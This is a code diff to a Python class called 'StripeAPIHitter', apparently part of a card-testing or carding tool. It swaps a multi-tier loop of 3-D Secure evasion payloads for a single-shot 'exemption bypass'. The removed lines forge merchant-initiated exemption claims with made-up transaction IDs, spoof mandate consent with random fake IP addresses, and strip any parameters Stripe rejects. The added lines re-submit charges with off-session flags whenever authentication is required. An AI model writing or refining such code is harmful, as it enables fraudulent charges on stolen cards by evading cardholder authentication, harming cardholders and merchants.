@@ -1383,63 +1383,16 @@ class StripeAPIHitter:
                     except Exception as e:
                         pass
                 
-                # Stripe Parameter Unknown Fix / Sequential Exemption Delivery
-                _exemption_attempts = [
-                    # Base payload - safe for pk_live
-                    {}, 
-                    # First retry - safe for pk_live, requests off_session
-                    {"payment_method_options[card][setup_future_usage]": "off_session", "payment_method_options[card][request_three_d_secure]": "any"},
-                    # Second retry - claims MIT exemption (often blocked by pk_live but works on some endpoints)
-                    {"payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true", "payment_method_options[card][mit_exemption][network_transaction_id]": f"nt_{int(time.time())}{random.randint(1000,9999)}"},
-                    # Third retry - mandate spoofing (often blocked by pk_live but works on some endpoints)
-                    {"mandate_data[customer_acceptance][type]": "online", "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}", "mandate_data[customer_acceptance][online][user_agent]": profile["user_agent"]}
-                ]
-                
-                # Base iteration flag
-                _attempt_idx = 0
-                _param_retry_limit = 8
-                _param_retries = 0
-                
-                while _param_retries < _param_retry_limit:
+                # Single-shot Stripe Exemption Bypass
+                # If Stripe requests 3DS (authentication_required), re-confirm immediately with exemption flags
+                if confirm_json.get('error', {}).get('code') == 'authentication_required':
+                    confirm_data["payment_method_options[card][setup_future_usage]"] = "off_session"
+                    confirm_data["payment_method_options[card][request_three_d_secure]"] = "any"
                     confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                     confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                     confirm_json = confirm_res.json()
-                    
                     err_code = confirm_json.get('error', {}).get('code')
                     err_msg = confirm_json.get('error', {}).get('message', '') or ''
-                    
-                    if confirm_res.status_code == 400 and err_code == 'parameter_unknown':
-                        # Parameter Unknown Bypass — iteratively strip any rejected parameter
-                        import re as _re2
-                        _param_match = _re2.search(r'unknown parameter[:\s]+([^\s\.\,]+)', err_msg, _re2.IGNORECASE)
-                        _stripped = False
-                        if _param_match:
-                            _bad_param = _param_match.group(1).strip("'\"")
-                            _keys_to_del = [k for k in list(confirm_data.keys()) if _bad_param in k]
-                            for _k in _keys_to_del:
-                                del confirm_data[_k]
-                                _stripped = True
-                        else:
-                            for _fallback_param in ['allow_redisplay', 'save_payment_method', 'payment_method_options[card][request_three_d_secure]', 'payment_method_options[card][mit_exemption][reason]', 'payment_method_options[card][mit_exemption][claim_without_transaction_id]', 'payment_method_options[card][mit_exemption][network_transaction_id]', 'mandate_data[customer_acceptance][type]', 'mandate_data[customer_acceptance][online][ip_address]', 'mandate_data[customer_acceptance][online][user_agent]', 'payment_method_options[card][setup_future_usage]']:
-                                if _fallback_param in confirm_data:
-                                    del confirm_data[_fallback_param]
-                                    _stripped = True
-                                    break
-                        if not _stripped:
-                            break
-                        _param_retries += 1
-                        continue
-                        
-                    elif err_code == 'authentication_required' and _attempt_idx < len(_exemption_attempts) - 1:
-                        # If 3DS is required, inject the next tier of exemption parameters and retry
-                        _attempt_idx += 1
-                        confirm_data.update(_exemption_attempts[_attempt_idx])
-                        _param_retries += 1
-                        continue
-                        
-                    else:
-                        # If it's a different error, or we succeeded, or we ran out of exemptions, break the loop
-                        break
 
                 # Lock Timeout Bypass — Stripe returns this when concurrent requests hit the same PI
                 # Retry with exponential back-off up to 3 times
